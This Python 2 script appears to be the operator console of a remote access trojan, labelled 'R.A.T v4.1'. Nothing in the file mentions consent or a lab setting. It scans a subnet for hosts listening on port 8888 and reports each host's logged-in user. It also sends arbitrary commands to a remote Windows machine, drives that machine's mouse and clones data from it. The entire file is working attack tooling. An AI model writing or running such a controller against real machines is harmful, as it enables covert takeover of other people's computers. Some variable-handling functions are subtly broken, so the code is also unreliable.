#!/usr/bin/python

import sys
import json
from client import client
from colors import colors
from mpos_osx import get_mouse_pos, Point
from time import sleep
from clone import clone_from

PORT = 8888

variables = {'@win': 'C:\\Windows',
             '@sys': 'C:\\Windows\\system32',
             '@yas': '10.71.36',
             ' '   : '&',
             '_'   : ' ',
             '`'   : '{BACKSPACE}'}
BACKUPVARS = variables

def save_vars():
    with open('vars.json', 'w') as f:
        json.dump(variables, f)

def load_vars():
    with open('vars.json', 'r') as f:
        variables = json.load(f)

def set_title(title):
    sys.stdout.write("\x1b]2;%s\x07" % title)

def set_var_args(cmd):
    args = cmd.split('&')
    for i in range(1, len(args)):
        key = '@%d' % i
        value = args[i]
        variables[key] = value

def add_var(cmd):
    parts = cmd.split(' ')
    if len(parts) != 4:
        return 'usage: let "@var" = "value"'

    key = parts[1]
    value = parts[3]
    value = swap_vars(value)
    variables[key] = value

    return 'added var %s to %s' % (key, value)

def swap_vars(cmd):
    for key, val in variables.iteritems():
        cmd = cmd.replace(key, val)
    return cmd

def print_vars():
    print(colors.OKGREEN + repr(variables).replace(',','\n') + colors.ENDC)

def main():
    ip = raw_input(colors.HEADER + 'ip: ' + colors.ENDC)

    if ip == 'exit':
        return 0

    ip = swap_vars(ip)

    s = client(ip, PORT, 5)
    try:
        if s.connect() == False:
            print(colors.FAIL + ('Failed to connect to: %s' % ip) + colors.ENDC)
            return 1
    except:
        print(colors.FAIL + ('Failed to connect to: %s' % ip) + colors.ENDC)
        return 1

    s.send('usr')
    user = s.recv()
    #swallow
    s.recv()
    set_title(user)

    print(colors.OKGREEN + ('connected to %s' % ip) + colors.ENDC)

    while 1:
        cmd = raw_input(colors.HEADER + user + ': ' + colors.ENDC)
        if cmd == 'exit':
            break
        elif cmd.startswith('let'):
            print(colors.WARNING + add_var(cmd) + colors.ENDC)
            continue
        elif cmd == 'vars':
            print_vars()
            continue
        elif cmd == 'vload':
            load_vars()
            continue
        elif cmd == 'vsave':
            save_vars()
            continue
        elif cmd == 'vreset':
            variables = BACKUPVARS
            continue

        cmd = swap_vars(cmd)
        set_var_args(cmd)
        s.send(cmd)

        response = s.recv()
        if response == 'waiting':
            continue
        else:
            print(colors.OKBLUE + response + colors.ENDC)
            #swallow waiting message
            s.recv()
    if s.connected == True:
        s.disconnect()

def scan_in_range(domain, start, stop):
    open_ip = []
    for i in range(int(start), int(stop)):
        ip = '%s.%d' % (domain, i)
        sys.stdout.write('\rscanning %s' % ip)
        sys.stdout.flush()
        s = client(ip, PORT, 1)
        if s.connect() == True:
            s.send('usr')
            usr = s.recv()
            #swallow
            s.recv()
            s.disconnect()
            open_ip.append((ip, usr))
    print('\n')
    return open_ip

def connect_mode():
    exit_code = -1
    while exit_code != 0:
        #print(colors.WARNING + 'connect' + colors.ENDC)
        set_title('Connect')
        exit_code = main()
    set_title('')

def scan_mode():
    set_title('Scan')
    print(colors.WARNING + 'scan'+ colors.ENDC)
    domain = raw_input(colors.HEADER + 'domain: ' + colors.ENDC)
    start = raw_input(colors.HEADER + 'start: ' + colors.ENDC)
    end = raw_input(colors.HEADER + 'end: ' + colors.ENDC)
    domain = swap_vars(domain)

    print('scanning...')

    set_title('Scanning')
    ips = scan_in_range(domain, start, end)

    if len(ips) == 0:
        print('no hosts found :(')
    else:
        print(colors.HEADER + 'found: ')
        for host in ips:
            print(colors.OKGREEN + repr(host))
        print(colors.ENDC)

    set_title('Scan Complete')

def capture_mode():
    set_title('Connect')

    ip = raw_input(colors.HEADER + 'ip: ' + colors.ENDC)

    if ip == 'exit':
        return

    ip = swap_vars(ip)

    s = client(ip, PORT, 5)
    try:
        if s.connect() == False:
            print(colors.FAIL + ('Failed to connect to: %s' % ip) + colors.ENDC)
            return
    except:
        print(colors.FAIL + ('Failed to connect to: %s' % ip) + colors.ENDC)
        return

    set_title('Capturing')
    print(colors.OKGREEN + 'capturing mouse position: control+c to exit' + colors.ENDC)

    while 1:
        pos = get_mouse_pos()
        #translate y coord for windows
        pos.Y =  abs(900 - pos.Y)
        s.send('mpos&%d&%d' % (pos.X, pos.Y))
        #swallow
        s.recv()

def clone_mode():
    set_title('Clone')

    ip = raw_input(colors.HEADER + 'ip: ' + colors.ENDC)

    if ip == 'exit':
        return

    ip = swap_vars(ip)

    s = client(ip, PORT, 5)
    try:
        if s.connect() == False:
            print(colors.FAIL + ('Failed to connect to: %s' % ip) + colors.ENDC)
            return
    except:
        print(colors.FAIL + ('Failed to connect to: %s' % ip) + colors.ENDC)
        return

    print('connected')

    top = raw_input(colors.HEADER + 'top: ' + colors.ENDC)

    set_title('Cloning')

    clone_from(top, s)

    print('done!')

    set_title('Clone Complete')

if __name__ == '__main__':
    mode = ''
    if len(sys.argv) == 2:
        mode = sys.argv[1]
    else:
        print(colors.WARNING + 'usage: python rat.py <connect/scan/ver>' + colors.ENDC)
        sys.exit()

    with open('header', 'r') as f:
        print(colors.HEADER + f.read() + colors.ENDC)

    try:
        if mode == 'connect':
            connect_mode()
        elif mode == 'scan':
            scan_mode()
        elif mode == 'mouse':
            capture_mode()
        elif mode == 'clone':
            clone_mode()
        elif mode == 'ver':
            print(colors.OKGREEN + 'R.A.T v4.1 "The Rat and the Python" (osx)\n' + colors.ENDC)
    except KeyboardInterrupt:
        print(colors.FAIL + 'Keyboard Interrupt.. Exiting...' + colors.ENDC)
        set_title('Exited')